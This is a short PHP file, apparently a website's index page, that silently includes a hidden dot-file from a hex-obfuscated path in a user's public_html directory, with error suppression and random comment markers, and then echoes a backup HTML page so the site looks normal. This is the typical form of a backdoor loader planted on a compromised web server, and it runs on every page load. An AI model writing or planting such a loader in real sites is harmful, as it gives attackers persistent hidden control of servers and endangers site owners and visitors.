<?php
/*f3088*/

@include /*738v*/("/home/y765zof1\x75i\x75f/p\x75blic_html/hpwinvipmy.com/ka/.bd90ebc7.oti");

/*f3088*/


echo @file_get_contents('index.html.bak.bak');